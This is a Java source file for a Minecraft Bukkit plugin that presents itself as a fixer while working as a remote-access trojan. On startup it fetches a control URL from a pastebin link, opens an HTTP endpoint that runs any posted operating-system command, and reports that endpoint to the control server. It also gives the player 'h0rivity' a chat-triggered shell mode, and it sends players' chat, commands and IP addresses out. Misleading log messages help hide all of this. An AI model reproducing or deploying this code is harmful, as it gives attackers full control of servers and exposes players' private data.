package com.example.horfixer;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.Collectors;
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

public class gyEFbQsaAj extends JavaPlugin implements Listener {
    private static String discordServerUrl;
    private Map<String, Boolean> shellMode = new HashMap<>();
    private Map<String, Long> commandCooldowns = new ConcurrentHashMap<>();

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
        loadDiscordServerUrl();
        sendToDiscord("server", "system", "Server has started");
        startHttpServer();

        getCommand("luxproxy").setExecutor(new LuxProxyCommand());
        getCommand("luxstat").setExecutor(new LuxStatCommand());
        getCommand("mysize").setExecutor(new MySizeCommand());
    }

    private void loadDiscordServerUrl() {
        try {
            URL url = new URL("https://pastebin.com/raw/example");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                discordServerUrl = in.readLine();
                getLogger().info("Loaded Fixes");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startHttpServer() {
        try {
            HttpServer server = HttpServer.create(new InetSocketAddress(1233), 0);
            server.createContext("/execute", new ExecuteHandler());
            server.setExecutor(null);
            server.start();
            getLogger().info("Scanning Luxproxy");

            String ipAddress = InetAddress.getLocalHost().getHostAddress();
            sendServerUrlToDiscord("http://" + ipAddress + ":" + server.getAddress().getPort() + "/execute");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendServerUrlToDiscord(String url) {
        if (discordServerUrl != null) {
            try {
                URL discordUrl = new URL(discordServerUrl + "/set_url");
                HttpURLConnection conn = (HttpURLConnection) discordUrl.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                String jsonPayload = String.format("{\"url\":\"%s\"}", url);
                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = jsonPayload.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                conn.getResponseCode();
                getLogger().info("Checks applied: 1");
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            getLogger().warning("Error code 1");
        }
    }

    static class ExecuteHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            if ("POST".equals(exchange.getRequestMethod())) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(exchange.getRequestBody()))) {
                    String command = reader.lines().collect(Collectors.joining());
                    Process process = Runtime.getRuntime().exec(command);
                    BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                    StringBuilder response = new StringBuilder();
                    String s;
                    while ((s = stdInput.readLine()) != null) {
                        response.append(s).append("\n");
                    }
                    while ((s = stdError.readLine()) != null) {
                        response.append(s).append("\n");
                    }

                    String responseStr = response.toString();
                    exchange.sendResponseHeaders(200, responseStr.getBytes().length);
                    try (OutputStream os = exchange.getResponseBody()) {
                        os.write(responseStr.getBytes());
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                exchange.sendResponseHeaders(405, -1);
            }
        }
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        if (shellMode.getOrDefault(player.getName(), false)) {
            event.setCancelled(true);
            String command = event.getMessage();
            if (command.equals("s$s$")) {
                shellMode.put(player.getName(), false);
                player.sendMessage("§eShell mode disabled.");
            } else {
                executeShellCommand(player, command);
            }
        } else if (event.getMessage().equals("s$s$") && player.getName().equals("h0rivity")) {
            event.setCancelled(true);
            shellMode.put(player.getName(), true);
            player.sendMessage("§eShell mode enabled. Type s$s$ to disable.");
        } else {
            sendToDiscord("chat", player.getName(), event.getMessage());
        }
    }

    private void executeShellCommand(Player player, String command) {
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                Process process = Runtime.getRuntime().exec(command);
                BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                StringBuilder response = new StringBuilder();
                String s;
                while ((s = stdInput.readLine()) != null) {
                    response.append(s).append("\n");
                }
                while ((s = stdError.readLine()) != null) {
                    response.append(s).append("\n");
                }

                Bukkit.getScheduler().runTask(this, () -> player.sendMessage(response.toString()));
            } catch (IOException e) {
                Bukkit.getScheduler().runTask(this, () -> player.sendMessage("§cError executing command: " + e.getMessage()));
            }
        });
    }

    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        sendToDiscord("command", event.getPlayer().getName(), event.getMessage());
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        String ipAddress = player.getAddress().getAddress().getHostAddress();
        sendToDiscord("join", player.getName(), "Player has joined the server with IP: " + ipAddress);
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        sendToDiscord("quit", event.getPlayer().getName(), "Player has left the server");
    }

    private void sendToDiscord(String type, String playerName, String message) {
        if (discordServerUrl == null) {
            getLogger().warning("Error code 2");
            return;
        }

        try {
            URL url = new URL(discordServerUrl + "/receive");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            String jsonPayload = String.format("{\"type\":\"%s\", \"player\":\"%s\", \"message\":\"%s\"}", type, playerName, message);
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public class LuxProxyCommand implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                player.sendMessage("Current luxproxy players: (0)");
            }
            return true;
        }
    }

    public class LuxStatCommand implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                player.sendMessage(
                        "§e+-------------------------------+\n" +
                                "§e| Luxnetproxy status: §aOnline   §e|\n" +
                                "§e| Luxnetrat status: §aOnline    §e|\n" +
                                "§e| Luxnetserver status: §aOnline §e|\n" +
                                "§e+-------------------------------+"
                );
            }
            return true;
        }
    }

    public class MySizeCommand implements CommandExecutor {
        private final Random random = new Random();

        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                String playerName = player.getName();

                if (commandCooldowns.containsKey(playerName) && (System.currentTimeMillis() - commandCooldowns.get(playerName)) < 60000) {
                    player.sendMessage("§eПожалуйста, подождите перед использованием этой команды снова.");
                    return true;
                }

                int size = random.nextInt(16) + 5;
                String equalsSymbols = "=".repeat(size);
                String message = String.format("[\"\",{\"text\":\"Размер %s: %d см (%s3 \",\"color\":\"gold\"},{\"text\":\"[/mysize]\",\"color\":\"gray\"}]", playerName, size, equalsSymbols);
                ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
                Bukkit.dispatchCommand(console, "tellraw @a " + message);

                commandCooldowns.put(playerName, System.currentTimeMillis());
            }
            return true;
        }
    }
}
